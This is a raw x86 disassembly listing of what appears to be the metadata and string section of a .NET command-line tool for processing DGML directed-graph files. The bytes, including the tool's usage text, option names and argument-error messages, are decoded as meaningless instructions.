  402d29:	add    BYTE PTR [edi+0x0],cl
  402d2c:	dec    esp
  402d2d:	add    BYTE PTR [edi+0x0],cl
  402d30:	inc    ebx
  402d31:	add    BYTE PTR [edi+0x0],bl
  402d34:	xor    al,BYTE PTR [ecx]
  402d36:	add    BYTE PTR [eax],al
  402d38:	cs push ebx
  402d3a:	add    BYTE PTR [edi+0x0],dh
  402d3d:	imul   eax,DWORD PTR [eax],0x630074
  402d43:	push   0x51005f00
  402d48:	add    BYTE PTR [ebp+0x0],dh
  402d4b:	add    BYTE PTR gs:[edx+0x0],dh
  402d4f:	jns    0x402d51
  402d51:	inc    esi
  402d52:	add    BYTE PTR [ecx+0x0],ch
  402d55:	ins    BYTE PTR es:[edi],dx
  402d56:	add    BYTE PTR [ebp+0x0],ah
  402d59:	pop    edi
  402d5a:	add    BYTE PTR [esi+0x0],cl
  402d5d:	dec    edi
  402d5e:	add    BYTE PTR [eax+eax*1+0x4f],cl
  402d62:	add    BYTE PTR [ebx+0x0],al
  402d65:	pop    edi
  402d66:	add    BYTE PTR [ecx],bh
  402d68:	add    DWORD PTR [eax],eax
  402d6a:	add    BYTE PTR [edx],dh
  402d6c:	push   ebx
  402d6d:	add    BYTE PTR [edi+0x0],dh
  402d70:	imul   eax,DWORD PTR [eax],0x630074
  402d76:	push   0x51005f00
  402d7b:	add    BYTE PTR [ebp+0x0],dh
  402d7e:	add    BYTE PTR gs:[edx+0x0],dh
  402d82:	jns    0x402d84
  402d84:	push   ebx
  402d85:	add    BYTE PTR [eax+eax*1+0x72],dh
  402d89:	add    BYTE PTR [ecx+0x0],ch
  402d8c:	outs   dx,BYTE PTR ds:[esi]
  402d8d:	add    BYTE PTR [edi+0x0],ah
  402d90:	pop    edi
  402d91:	add    BYTE PTR [esi+0x0],cl
  402d94:	dec    edi
  402d95:	add    BYTE PTR [eax+eax*1+0x4f],cl
  402d99:	add    BYTE PTR [ebx+0x0],al
  402d9c:	pop    edi
  402d9d:	add    BYTE PTR [ecx+0x1],al
  402da0:	add    BYTE PTR [eax],al
  402da2:	sub    al,0x53
  402da4:	add    BYTE PTR [edi+0x0],dh
  402da7:	imul   eax,DWORD PTR [eax],0x630074
  402dad:	push   0x51005f00
  402db2:	add    BYTE PTR [ebp+0x0],dh
  402db5:	add    BYTE PTR gs:[ebx+0x0],dh
  402db9:	je     0x402dbb
  402dbb:	imul   eax,DWORD PTR [eax],0x6e006f
  402dc1:	pop    edi
  402dc2:	add    BYTE PTR [esi+0x0],cl
  402dc5:	dec    edi
  402dc6:	add    BYTE PTR [eax+eax*1+0x4f],cl
  402dca:	add    BYTE PTR [ebx+0x0],al
  402dcd:	pop    edi
  402dce:	add    BYTE PTR [eax+0x1],cl
  402dd1:	add    BYTE PTR [eax],al
  402dd3:	cs push ebx
  402dd5:	add    BYTE PTR [edi+0x0],dh
  402dd8:	imul   eax,DWORD PTR [eax],0x630074
  402dde:	push   0x55005f00
  402de3:	add    BYTE PTR [ecx+0x0],cl
  402de6:	inc    ebx
  402de7:	add    BYTE PTR [ebp+0x0],dh
  402dea:	ins    BYTE PTR es:[edi],dx
  402deb:	add    BYTE PTR [eax+eax*1+0x75],dh
  402def:	add    BYTE PTR [edx+0x0],dh
  402df2:	add    BYTE PTR gs:[edi+0x0],bl
  402df6:	dec    esi
  402df7:	add    BYTE PTR [edi+0x0],cl
  402dfa:	dec    esp
  402dfb:	add    BYTE PTR [edi+0x0],cl
  402dfe:	inc    ebx
  402dff:	add    BYTE PTR [edi+0x0],bl
  402e02:	dec    esp
  402e03:	add    DWORD PTR [eax],eax
  402e05:	add    BYTE PTR [ebx+edx*2],cl
  402e08:	add    BYTE PTR [ecx+0x0],bh
  402e0b:	outs   dx,BYTE PTR ds:[esi]
  402e0c:	add    BYTE PTR [eax+eax*1+0x61],dh
  402e10:	add    BYTE PTR [eax+0x0],bh
  402e13:	pop    eax
  402e14:	add    DWORD PTR [eax],eax
  402e16:	add    BYTE PTR [ecx],al
  402e18:	adc    al,0x49
  402e1a:	outs   dx,BYTE PTR ds:[esi]
  402e1b:	jbe    0x402e7e
  402e1d:	ins    BYTE PTR es:[edi],dx
  402e1e:	imul   esp,DWORD PTR [eax+eiz*1+0x43],0x75746c75
  402e26:	jb     0x402e8d
  402e28:	and    BYTE PTR [esi+0x61],cl
  402e2b:	ins    DWORD PTR es:[edi],dx
  402e2c:	add    DWORD PTR gs:[eax],edx
  402e2f:	dec    ebp
  402e30:	imul   esi,DWORD PTR [ebx+0x73],0x20676e69
  402e37:	popa   
  402e38:	jb     0x402ea1
  402e3a:	jne    0x402ea9
  402e3c:	outs   dx,BYTE PTR gs:[esi]
  402e3e:	je     0x402e41
  402e40:	and    eax,0x7373694d
  402e45:	imul   ebp,DWORD PTR [esi+0x67],0x79656b20
  402e4c:	and    BYTE PTR [esi+0x72],ah
  402e4f:	outs   dx,DWORD PTR ds:[esi]
  402e50:	ins    DWORD PTR es:[edi],dx
  402e51:	and    BYTE PTR [edi],ah
  402e53:	imul   esp,DWORD PTR [ebp+0x79],0x3d
  402e57:	jbe    0x402eba
  402e59:	ins    BYTE PTR es:[edi],dx
  402e5a:	jne    0x402ec1
  402e5c:	daa    
  402e5d:	and    BYTE PTR [ecx+0x72],ah
  402e60:	addr16 jne 0x402ed0
  402e63:	outs   dx,BYTE PTR gs:[esi]
  402e65:	je     0x402e68
  402e67:	or     eax,0x6c6c754e
  402e6c:	and    BYTE PTR [ecx+0x72],al
  402e6f:	addr16 jne 0x402edf
  402e72:	outs   dx,BYTE PTR gs:[esi]
  402e74:	je     0x402e77
  402e76:	push   ss
  402e77:	dec    esi
  402e78:	jne    0x402ee6
  402e7a:	ins    BYTE PTR es:[edi],dx
  402e7b:	and    BYTE PTR [edi+0x72],ch
  402e7e:	and    BYTE PTR [ebp+0x6d],ah
  402e81:	jo     0x402ef7
  402e83:	jns    0x402ea5
  402e85:	popa   
  402e86:	jb     0x402eef
  402e88:	jne    0x402ef7
  402e8a:	outs   dx,BYTE PTR gs:[esi]
  402e8c:	je     0x402e8f
  402e8e:	sub    ecx,DWORD PTR [esi+0x75]
  402e91:	ins    BYTE PTR es:[edi],dx
  402e92:	ins    BYTE PTR es:[edi],dx
  402e93:	and    BYTE PTR [edi+0x72],ch
  402e96:	and    BYTE PTR [ebp+0x6d],ah
  402e99:	jo     0x402f0f
  402e9b:	jns    0x402ebd
  402e9d:	imul   esp,DWORD PTR [ebp+0x79],0x20
  402ea1:	data16 jb 0x402f13
  402ea4:	ins    DWORD PTR es:[edi],dx
  402ea5:	and    BYTE PTR [edi],ah
  402ea7:	imul   esp,DWORD PTR [ebp+0x79],0x3d
  402eab:	jbe    0x402f0e
  402ead:	ins    BYTE PTR es:[edi],dx
  402eae:	jne    0x402f15
  402eb0:	daa    
  402eb1:	and    BYTE PTR [ecx+0x72],ah
  402eb4:	addr16 jne 0x402f24
  402eb7:	outs   dx,BYTE PTR gs:[esi]
  402eb9:	je     0x402ebc
  402ebb:	sub    eax,0x6c6c754e
  402ec0:	and    BYTE PTR [edi+0x72],ch
  402ec3:	and    BYTE PTR [ebp+0x6d],ah
  402ec6:	jo     0x402f3c
  402ec8:	jns    0x402eea
  402eca:	jbe    0x402f2d
  402ecc:	ins    BYTE PTR es:[edi],dx
  402ecd:	jne    0x402f34
  402ecf:	and    BYTE PTR [esi+0x72],ah
  402ed2:	outs   dx,DWORD PTR ds:[esi]
  402ed3:	ins    DWORD PTR es:[edi],dx
  402ed4:	and    BYTE PTR [edi],ah
  402ed6:	imul   esp,DWORD PTR [ebp+0x79],0x3d
  402eda:	jbe    0x402f3d
  402edc:	ins    BYTE PTR es:[edi],dx
  402edd:	jne    0x402f44
  402edf:	daa    
  402ee0:	and    BYTE PTR [ecx+0x72],ah
  402ee3:	addr16 jne 0x402f53
  402ee6:	outs   dx,BYTE PTR gs:[esi]
  402ee8:	je     0x402eeb
  402eea:	adc    eax,0x65726e55
  402eef:	arpl   WORD PTR [edi+0x67],bp
  402ef2:	outs   dx,BYTE PTR ds:[esi]
  402ef3:	imul   edi,DWORD PTR [edx+0x65],0x72612064
  402efa:	addr16 jne 0x402f6a
  402efd:	outs   dx,BYTE PTR gs:[esi]
  402eff:	je     0x402f02
  402f01:	adc    edx,DWORD PTR [ebp+0x6e]
  402f04:	jb     0x402f6b
  402f06:	arpl   WORD PTR [edi+0x67],bp
  402f09:	outs   dx,BYTE PTR ds:[esi]
  402f0a:	imul   edi,DWORD PTR [edx+0x65],0x6f662064
  402f11:	jb     0x402f80
  402f13:	popa   
  402f14:	je     0x402f17
  402f16:	add    al,0x2d
  402f18:	popa   
  402f19:	ins    BYTE PTR es:[edi],dx
  402f1a:	ins    BYTE PTR es:[edi],dx
  402f1b:	add    DWORD PTR [ebx],ecx
  402f1d:	sub    eax,0x65637865
  402f22:	jo     0x402f98
  402f24:	imul   ebp,DWORD PTR [edi+0x6e],0x2d050173
  402f2b:	push   0x1706c65
  402f30:	push   es
  402f31:	sub    eax,0x75706e69
  402f36:	je     0x402f39
  402f38:	pop    es
  402f39:	sub    eax,0x6d726f66
  402f3e:	popa   
  402f3f:	je     0x402f42
  402f41:	pop    es
  402f42:	sub    eax,0x7074756f
  402f47:	jne    0x402fbd
  402f49:	add    DWORD PTR ds:0x7461702d,eax
  402f4f:	push   0x712d0601
  402f54:	jne    0x402fbb
  402f56:	jb     0x402fd1
  402f58:	add    DWORD PTR ds:0x6578652d,eax
  402f5e:	arpl   WORD PTR [ecx],ax
  402f60:	add    ch,BYTE PTR ds:0x2d0a013f
  402f66:	jne    0x402fd1
  402f68:	arpl   WORD PTR [ebp+0x6c],si
  402f6b:	je     0x402fe2
  402f6d:	jb     0x402fd4
  402f6f:	add    ebp,edx
  402f71:	add    eax,0x636f7250
  402f76:	gs jae 0x402fec
  402f79:	gs jae 0x402f9c
  402f7c:	inc    esp
  402f7d:	imul   esi,DWORD PTR [edx+0x65],0x64657463
  402f84:	and    BYTE PTR [edi+0x72],al
  402f87:	popa   
  402f88:	jo     0x402ff2
  402f8a:	jae    0x402f99
  402f8c:	or     cl,BYTE PTR ds:0x6172470a
  402f92:	jo     0x402ffc
  402f94:	inc    ebx
  402f95:	ins    DWORD PTR es:[edi],dx
  402f96:	and    BYTE PTR fs:[ebx+0x2d],bl
  402f9a:	aas    
  402f9b:	pop    ebp
  402f9c:	and    BYTE PTR [ebx+0x2d],bl
  402f9f:	popa   
  402fa0:	ins    BYTE PTR es:[edi],dx
  402fa1:	ins    BYTE PTR es:[edi],dx
  402fa2:	pop    ebp
  402fa3:	and    BYTE PTR [ebx+0x2d],bl
  402fa6:	gs js  0x40300c
  402fa9:	gs jo  0x403020
  402fac:	imul   ebp,DWORD PTR [edi+0x6e],0x5b205d73
  402fb3:	sub    eax,0x75706e69
  402fb8:	je     0x402fda
  402fba:	cmp    al,0x66
  402fbc:	imul   ebp,DWORD PTR [ebp+eiz*2+0x20],0x656d616e
  402fc4:	ds pop ebp
  402fc6:	and    BYTE PTR [ebx+0x2d],bl
  402fc9:	jno    0x403040
  402fcb:	gs jb  0x403047
  402fce:	and    BYTE PTR [esi+eiz*2],bh
  402fd1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x20],0x656d616e
  402fd9:	ds pop ebp
  402fdb:	and    BYTE PTR [ebx+0x2d],bl
  402fde:	gs js  0x403046
  402fe1:	arpl   WORD PTR [eax],sp
  402fe3:	and    dh,BYTE PTR [ecx+0x75]
  402fe6:	gs jb  0x403062
  402fe9:	and    BYTE PTR [edi+ebp*2+0x20],dh
  402fed:	gs js  0x403055
  402ff0:	arpl   WORD PTR [ebp+0x74],si
  402ff3:	and    bl,BYTE PTR gs:[ebp+0x20]
  402ff7:	pop    ebx
  402ff8:	sub    eax,0x7074756f
  402ffd:	jne    0x403073
  402fff:	and    BYTE PTR [esi+eiz*2],bh
  403002:	imul   ebp,DWORD PTR [ebp+eiz*2+0x20],0x656d616e
  40300a:	ds pop ebp
  40300c:	and    BYTE PTR [ebx+0x2d],bl
  40300f:	jo     0x403072
  403011:	je     0x40307b
  403013:	and    BYTE PTR [ecx+eiz*2],bh
  403016:	ins    BYTE PTR es:[edi],dx
  403017:	imul   esp,DWORD PTR [ecx+0x73],0x703c3d3e
  40301e:	popa   
  40301f:	je     0x403089
  403021:	ds pop ebp
  403023:	or     eax,0x200a0d0a
  403028:	and    BYTE PTR [eax],ah
  40302a:	and    BYTE PTR ds:0x2020203f,ch
  403030:	and    BYTE PTR [eax],ah
  403032:	and    BYTE PTR [eax],ah
  403034:	and    BYTE PTR [eax],ah
  403036:	and    BYTE PTR [eax+0x72],dl
  403039:	imul   ebp,DWORD PTR [esi+0x74],0x68742073
  403040:	imul   esi,DWORD PTR [ebx+0x20],0x706c6568
  403047:	and    BYTE PTR [ebp+0x65],ch
  40304a:	jae    0x4030bf
  40304c:	popa   
  40304d:	addr16 gs cs or eax,0x2020200a
  403055:	and    BYTE PTR ds:0x206c6c61,ch
  40305b:	and    BYTE PTR [eax],ah
  40305d:	and    BYTE PTR [eax],ah
  40305f:	and    BYTE PTR [eax],ah
  403061:	and    BYTE PTR [edi+0x61],al
  403064:	je     0x4030ce
  403066:	gs jb  0x4030dc
  403069:	and    BYTE PTR [ecx+0x6c],ah
  40306c:	ins    BYTE PTR es:[edi],dx
  40306d:	and    BYTE PTR [ecx+0x6e],ch
  403070:	je     0x4030d7
  403072:	jb     0x4030e1
  403074:	gs imul esp,DWORD PTR fs:[ecx+0x74],0x75712065
  40307d:	gs jb  0x4030f9
  403080:	and    BYTE PTR [edx+0x65],dh
  403083:	jae    0x4030fa
  403085:	ins    BYTE PTR es:[edi],dx
  403086:	je     0x4030fb
  403088:	sub    al,0x20
  40308a:	imul   ebp,DWORD PTR [esi+0x73],0x64616574
  403091:	and    BYTE PTR [edi+0x66],ch
  403094:	and    BYTE PTR [edx+0x75],ch
  403097:	jae    0x40310d
  403099:	and    BYTE PTR [eax+ebp*2+0x65],dh
  40309d:	and    BYTE PTR [ecx+eiz*2+0x73],ch
  4030a1:	je     0x4030c3
  4030a3:	outs   dx,BYTE PTR ds:[esi]
  4030a4:	outs   dx,DWORD PTR ds:[esi]
  4030a5:	fs and BYTE PTR gs:[ebx+0x65],dh
  4030aa:	je     0x4030da
  4030ac:	or     eax,0x2020200a
  4030b1:	and    BYTE PTR ds:0x65637865,ch
  4030b7:	jo     0x40312d
  4030b9:	imul   ebp,DWORD PTR [edi+0x6e],0x65522073
  4030c0:	jo     0x403131
  4030c2:	jb     0x403138
  4030c4:	jae    0x4030e6
  4030c6:	jno    0x40313d
  4030c8:	gs jb  0x403144
  4030cb:	and    BYTE PTR [ebp+0x78],ah
  4030ce:	arpl   WORD PTR [ebp+0x70],sp
  4030d1:	je     0x40313c
  4030d3:	outs   dx,DWORD PTR ds:[esi]
  4030d4:	outs   dx,BYTE PTR ds:[esi]
  4030d5:	jae    0x4030f7
  4030d7:	imul   ebp,DWORD PTR [esi+0x20],0x6d67642e
  4030de:	ins    BYTE PTR es:[edi],dx
  4030df:	and    BYTE PTR [edi+0x75],ch
  4030e2:	je     0x403154
  4030e4:	jne    0x40315a
  4030e6:	cs or  eax,0x2020200a
  4030ec:	and    BYTE PTR ds:0x75706e69,ch
  4030f2:	je     0x403114
  4030f4:	and    BYTE PTR [eax],ah
  4030f6:	and    BYTE PTR [eax],ah
  4030f8:	and    BYTE PTR [ebx+0x70],dl
  4030fb:	arpl   WORD PTR gs:[ecx+0x66],bp
  4030ff:	imul   esp,DWORD PTR [ebp+0x73],0x65687420
  403106:	and    BYTE PTR [ecx+0x6e],ch
  403109:	jo     0x403180
  40310b:	je     0x40312d
  40310d:	cs fs ins DWORD PTR es:[di],dx
  403111:	ins    BYTE PTR es:[edi],dx
  403112:	and    BYTE PTR [esi+0x69],ah
  403115:	ins    BYTE PTR es:[edi],dx
  403116:	and    BYTE PTR gs:[edi+ebp*2+0x20],dh
  40311b:	jo     0x40318f
  40311d:	outs   dx,DWORD PTR ds:[esi]
  40311e:	arpl   WORD PTR [ebp+0x73],sp
  403121:	jae    0x403151
  403123:	or     eax,0x2020200a
  403128:	and    BYTE PTR ds:0x7074756f,ch
  40312e:	jne    0x4031a4
  403130:	and    BYTE PTR [eax],ah
  403132:	and    BYTE PTR [eax],ah
  403134:	and    BYTE PTR [ebx+0x70],dl
  403137:	arpl   WORD PTR gs:[ecx+0x66],bp
  40313b:	imul   esp,DWORD PTR [ebp+0x73],0x2e206120
  403142:	fs ins DWORD PTR es:[di],dx
  403145:	ins    BYTE PTR es:[edi],dx
  403146:	and    BYTE PTR [esi+0x69],ah
  403149:	ins    BYTE PTR es:[edi],dx
  40314a:	and    BYTE PTR gs:[edi+ebp*2+0x20],dh
  40314f:	outs   dx,DWORD PTR ds:[esi]
  403150:	jne    0x4031c6
  403152:	jo     0x4031c9
  403154:	je     0x403184
  403156:	or     eax,0x2020200a
  40315b:	and    BYTE PTR ds:0x72657571,ch
  403161:	jns    0x403183
  403163:	and    BYTE PTR [eax],ah
  403165:	and    BYTE PTR [eax],ah
  403167:	and    BYTE PTR [ebx+0x70],dl
  40316a:	arpl   WORD PTR gs:[ecx+0x66],bp
  40316e:	imul   esp,DWORD PTR [ebp+0x73],0x2e206120
  403175:	fs addr16 jno 0x4031e5
  403179:	and    BYTE PTR [esi+0x69],ah
  40317c:	ins    BYTE PTR es:[edi],dx
  40317d:	and    BYTE PTR gs:[edi+ebp*2+0x20],dh
  403182:	gs js  0x4031ea
  403185:	arpl   WORD PTR [ebp+0x74],si
  403188:	gs cs or eax,0x2020200a
  40318f:	and    BYTE PTR ds:0x63657865,ch
  403195:	and    BYTE PTR [eax],ah
  403197:	and    BYTE PTR [eax],ah
  403199:	and    BYTE PTR [eax],ah
  40319b:	and    BYTE PTR [ebx+0x70],dl
  40319e:	arpl   WORD PTR gs:[ecx+0x66],bp
  4031a2:	imul   esp,DWORD PTR [ebp+0x73],0x2e206120
  4031a9:	fs addr16 jno 0x403219
  4031ad:	and    BYTE PTR [ebx+0x74],dh
  4031b0:	popa   
  4031b1:	je     0x403218
  4031b3:	ins    DWORD PTR es:[edi],dx
  4031b4:	outs   dx,BYTE PTR gs:[esi]
  4031b6:	je     0x4031d8
  4031b8:	je     0x403229
  4031ba:	and    BYTE PTR [ebp+0x78],ah
  4031bd:	arpl   WORD PTR gs:[ebp+0x74],si
  4031c1:	gs cs or eax,0x2020200a
  4031c8:	and    BYTE PTR ds:0x68746170,ch
  4031ce:	and    BYTE PTR [eax],ah
  4031d0:	and    BYTE PTR [eax],ah
  4031d2:	and    BYTE PTR [eax],ah
  4031d4:	and    BYTE PTR [ebx+0x70],dl
  4031d7:	arpl   WORD PTR gs:[ecx+0x66],bp
  4031db:	imul   esp,DWORD PTR [ebp+0x73],0x63206120
  4031e2:	outs   dx,DWORD PTR ds:[esi]
  4031e3:	ins    DWORD PTR es:[edi],dx
  4031e4:	ins    DWORD PTR es:[edi],dx
  4031e5:	outs   dx,DWORD PTR ds:[esi]
  4031e6:	outs   dx,BYTE PTR ds:[esi]
  4031e7:	and    BYTE PTR [eax+0x61],dh
  4031ea:	je     0x403254
  4031ec:	and    BYTE PTR [ecx+0x6c],ah
  4031ef:	imul   esp,DWORD PTR [ecx+0x73],0xd0a0d2e
  4031f6:	or     ah,BYTE PTR [eax]
  4031f8:	and    BYTE PTR [eax],ah
  4031fa:	and    BYTE PTR [eax+ebp*2+0x65],dl
  4031fe:	and    BYTE PTR ds:0x75706e69,ch
  403204:	je     0x403232
  403206:	and    BYTE PTR ds:0x72657571,ch
  40320c:	jns    0x40323a
  40320e:	and    BYTE PTR ds:0x63657865,ch
  403214:	and    BYTE PTR [ecx+0x6e],ah
  403217:	and    BYTE PTR fs:0x68746170,ch
  40321e:	and    BYTE PTR [edi+0x70],ch
  403221:	je     0x40328c
  403223:	outs   dx,DWORD PTR ds:[esi]
  403224:	outs   dx,BYTE PTR ds:[esi]
  403225:	jae    0x403247
  403227:	ins    DWORD PTR es:[edi],dx
  403228:	popa   
  403229:	jns    0x40324b
  40322b:	bound  esp,QWORD PTR [ebp+0x20]
  40322e:	jae    0x4032a0
  403230:	arpl   WORD PTR gs:[ecx+0x66],bp
  403234:	imul   esp,DWORD PTR [ebp+0x64],0x6c756d20
  40323b:	je     0x4032a6
  40323d:	jo     0x4032ab
  40323f:	and    BYTE PTR gs:[ecx+ebp*2+0x6d],dh
  403244:	gs jae 0x403275
  403247:	add    BYTE PTR [edx+0x53],al
  40324a:	dec    edx
  40324b:	inc    edx
  40324c:	add    DWORD PTR [eax],eax
  40324e:	add    DWORD PTR [eax],eax
  403250:	add    BYTE PTR [eax],al
  403252:	add    BYTE PTR [eax],al
  403254:	or     al,0x0
  403256:	add    BYTE PTR [eax],al
  403258:	jbe    0x40328e
  40325a:	xor    BYTE PTR cs:[esi],ch
  40325d:	xor    esi,DWORD PTR [eax]
  40325f:	xor    esi,DWORD PTR [ecx]
  403261:	cmp    DWORD PTR [eax],eax
  403263:	add    BYTE PTR [eax],al
  403265:	add    BYTE PTR ds:0x6c00,al
  40326b:	add    BYTE PTR [eax+0x9],al
  40326e:	add    BYTE PTR [eax],al
  403270:	and    edi,DWORD PTR [esi+0x0]
  403273:	add    BYTE PTR [ecx+ecx*1+0xe2c0000],ch
  40327a:	add    BYTE PTR [eax],al
  40327c:	and    edx,DWORD PTR [ebx+0x74]
  40327f:	jb     0x4032ea
  403281:	outs   dx,BYTE PTR ds:[esi]
  403282:	addr16 jae 0x403285
  403285:	add    BYTE PTR [eax],al
  403287:	add    al,bl
  403289:	pop    ss
  40328a:	add    BYTE PTR [eax],al
  40328c:	push   esp
  40328d:	add    al,0x0
  40328f:	add    BYTE PTR [ebx],ah
  403291:	push   ebp
  403292:	push   ebx
  403293:	add    BYTE PTR [esp+ebx*1],ch
  403296:	add    BYTE PTR [eax],al
  403298:	adc    BYTE PTR [eax],al
  40329a:	add    BYTE PTR [eax],al
  40329c:	and    eax,DWORD PTR [edi+0x55]
  40329f:	dec    ecx
  4032a0:	inc    esp
  4032a1:	add    BYTE PTR [eax],al
  4032a3:	add    BYTE PTR [esp+ebx*1],bh
  4032a6:	add    BYTE PTR [eax],al
  4032a8:	mov    BYTE PTR [edi],al
  4032aa:	add    BYTE PTR [eax],al
  4032ac:	and    eax,DWORD PTR [edx+0x6c]
  4032af:	outs   dx,DWORD PTR ds:[esi]
  4032b0:	bound  eax,QWORD PTR [eax]
  4032b2:	add    BYTE PTR [eax],al
  4032b4:	add    BYTE PTR [eax],al
  4032b6:	add    BYTE PTR [eax],al
  4032b8:	add    al,BYTE PTR [eax]
  4032ba:	add    BYTE PTR [ecx],al
  4032bc:	push   edi
  4032bd:	sbb    eax,0x30909a2
  4032c2:	add    BYTE PTR [eax],al
  4032c4:	add    dl,bh
  4032c6:	and    eax,0x160033
  4032cb:	add    BYTE PTR [ecx],al
  4032cd:	add    BYTE PTR [eax],al
  4032cf:	add    BYTE PTR [edx],dh
  4032d1:	add    BYTE PTR [eax],al
  4032d3:	add    BYTE PTR [esi],al
  4032d5:	add    BYTE PTR [eax],al
  4032d7:	add    BYTE PTR [edx],dl
  4032d9:	add    BYTE PTR [eax],al
  4032db:	add    BYTE PTR [edi],ah
  4032dd:	add    BYTE PTR [eax],al
  4032df:	add    BYTE PTR [eax],dl
  4032e1:	add    BYTE PTR [eax],al
  4032e3:	add    BYTE PTR [ebp+0x0],al
  4032e6:	add    BYTE PTR [eax],al
  4032e8:	push   cs
  4032e9:	add    BYTE PTR [eax],al
  4032eb:	add    BYTE PTR [edx],bl
  4032ed:	add    BYTE PTR [eax],al
  4032ef:	add    BYTE PTR [edx],cl
  4032f1:	add    BYTE PTR [eax],al
  4032f3:	add    BYTE PTR [edx],al
  4032f5:	add    BYTE PTR [eax],al
  4032f7:	add    BYTE PTR [eax],bl
  4032f9:	add    BYTE PTR [eax],al
  4032fb:	add    BYTE PTR [edx],bl
  4032fd:	add    BYTE PTR [eax],al
  4032ff:	add    BYTE PTR [edx],al
  403301:	add    BYTE PTR [eax],al
  403303:	add    BYTE PTR [ecx],al
  403305:	add    BYTE PTR [eax],al
  403307:	add    BYTE PTR ds:0x1000000,al
  40330d:	add    BYTE PTR [eax],al
  40330f:	add    BYTE PTR [ecx],al
  403311:	add    BYTE PTR [eax],al
  403313:	add    BYTE PTR [eax],al
  403315:	add    BYTE PTR [edx],cl
  403317:	add    BYTE PTR [ecx],al
  403319:	add    BYTE PTR [eax],al
  40331b:	add    BYTE PTR [eax],al
  40331d:	add    BYTE PTR [esi],al
  40331f:	add    BYTE PTR [esi+0x6008700],cl
  403325:	add    BYTE PTR [ebp+0xa008700],dl
  40332b:	add    ah,dl
  40332d:	add    BYTE PTR [edi],bl
  40332f:	add    BYTE PTR [edx],cl
  403331:	add    BYTE PTR [edx+0x6001f01],ah
  403337:	add    BYTE PTR [ebp+0x2],bl
  40333a:	dec    esp
  40333b:	add    al,BYTE PTR [esi]
  40333d:	add    BYTE PTR [esi+0x6027902],cl
  403343:	add    BYTE PTR [esi+0x7],dh
  403346:	pop    esp
  403347:	pop    es
  403348:	push   es
  403349:	add    BYTE PTR [esi+0x6078f07],ch
  40334f:	add    dl,al
  403351:	pop    es
  403352:	xchg   DWORD PTR [eax],eax
  403354:	push   es
  403355:	add    dl,ch
  403357:	pop    es
  403358:	fadd   DWORD PTR [edi]
  40335a:	push   es
  40335b:	add    BYTE PTR [ecx],al
  40335d:	or     al,bl
  40335f:	pop    es
  403360:	push   es
  403361:	add    BYTE PTR [esi],bl
  403363:	or     al,bl
  403365:	pop    es
  403366:	push   es
  403367:	add    BYTE PTR [eax+ecx*1],bh
  40336a:	fadd   DWORD PTR [edi]
  40336c:	push   es
  40336d:	add    BYTE PTR [ebp+0x8],dl
  403370:	fadd   DWORD PTR [edi]
  403372:	push   es
  403373:	add    BYTE PTR [esi+0x8],ch
  403376:	fadd   DWORD PTR [edi]
  403378:	push   es
  403379:	add    BYTE PTR [ecx+0x607d808],cl
  40337f:	add    BYTE PTR [edx+0x607d808],ah
  403385:	add    BYTE PTR [edi+0x607d808],bh
  40338b:	add    ch,ah
  40338d:	or     BYTE PTR [edx+eax*1+0x6],cl
  403391:	add    BYTE PTR [edi],al
  403393:	or     DWORD PTR [edx+eax*1+0x6],ecx
  403397:	add    BYTE PTR [ecx],ch
  403399:	or     eax,ebx
  40339b:	pop    es
  40339c:	push   es
  40339d:	add    BYTE PTR [ecx+ecx*1-0x28],al
  4033a1:	pop    es
  4033a2:	push   es
  4033a3:	add    BYTE PTR [ebp+0x9],bl
  4033a6:	fadd   DWORD PTR [edi]
  4033a8:	push   es
  4033a9:	add    BYTE PTR [ebx+0x6097b09],bl
  4033af:	add    ah,cl
  4033b1:	or     DWORD PTR [ecx-0x1fff98f7],edi
  4033b7:	or     DWORD PTR [eax],eax
  4033b9:	add    BYTE PTR [esi],al
  4033bb:	add    bh,ch
  4033bd:	or     DWORD PTR [ebx+0x9],edi
  4033c0:	push   es
  4033c1:	add    BYTE PTR [edi],cl
  4033c3:	or     al,BYTE PTR [edi+0x33000600]
  4033c9:	or     ah,BYTE PTR [edx]
  4033cb:	or     cl,BYTE PTR [esi]
  4033cd:	add    BYTE PTR [esi+0xa],dh
  4033d0:	pop    ds
  4033d1:	add    BYTE PTR [esi],al
  4033d3:	add    BYTE PTR [edx+0x600870a],cl
  4033d9:	add    BYTE PTR [edx+ecx*1+0x60a92],bl
  4033e0:	mov    cl,0xa
  4033e2:	xchg   DWORD PTR [eax],eax
  4033e4:	push   es
  4033e5:	add    cl,dl
  4033e7:	or     al,BYTE PTR [edi+0x22000600]
  4033ed:	or     eax,DWORD PTR [edi+0x62000600]
  4033f3:	or     eax,DWORD PTR [edi-0x3cfffa00]
  4033f9:	or     ebp,DWORD PTR [eax-0x2fff5f5]
  4033ff:	or     ebx,DWORD PTR [edi]
  403401:	add    BYTE PTR [esi],al
  403403:	add    BYTE PTR ds:0x600870c,bh
  403409:	add    BYTE PTR [ebx+0xc],dl
  40340c:	xchg   DWORD PTR [eax],eax
  40340e:	adc    al,BYTE PTR [eax]
  403410:	(bad)  
  403411:	or     al,0x6d
  403413:	or     al,0x6
  403415:	add    al,al
  403417:	or     al,0x87
  403419:	add    BYTE PTR [esi],al
  40341b:	add    ch,al
  40341d:	or     al,0x87
  40341f:	add    BYTE PTR [esi],al
  403421:	add    BYTE PTR [edx],al
  403423:	or     eax,0x160087
  403428:	xor    DWORD PTR ds:0x60d19,ecx
  40342e:	dec    eax
  40342f:	or     eax,0x609b9
  403434:	gs or  eax,0x6097b
  40343a:	nop
  40343b:	or     eax,0x1607d8
  403440:	(bad)  
  403441:	or     eax,0x160db0
  403446:	fisttp WORD PTR ds:0xdb0
  40344c:	add    BYTE PTR [eax],al
  40344e:	add    DWORD PTR [eax],eax
  403450:	add    BYTE PTR [eax],al
  403452:	add    BYTE PTR [eax],al
  403454:	add    DWORD PTR [eax],eax
  403456:	add    DWORD PTR [eax],eax
  403458:	add    BYTE PTR [eax],al
  40345a:	adc    BYTE PTR [eax],al
  40345c:	pop    ss
  40345d:	add    BYTE PTR [edi],bl
  40345f:	add    BYTE PTR ds:0x1000100,al
  403465:	add    BYTE PTR [ecx],al
  403467:	add    BYTE PTR [eax],dl
  403469:	add    BYTE PTR [edx+0x0],al
  40346c:	pop    ds
  40346d:	add    BYTE PTR ds:0x3000100,al
  403473:	add    BYTE PTR [ebx],al
  403475:	add    DWORD PTR [eax],eax
  403477:	add    BYTE PTR [ebx+0x0],cl
  40347a:	add    BYTE PTR [eax],al
  40347c:	or     DWORD PTR [eax],eax
  40347e:	add    al,BYTE PTR [eax]
  403480:	sldt   WORD PTR [eax]
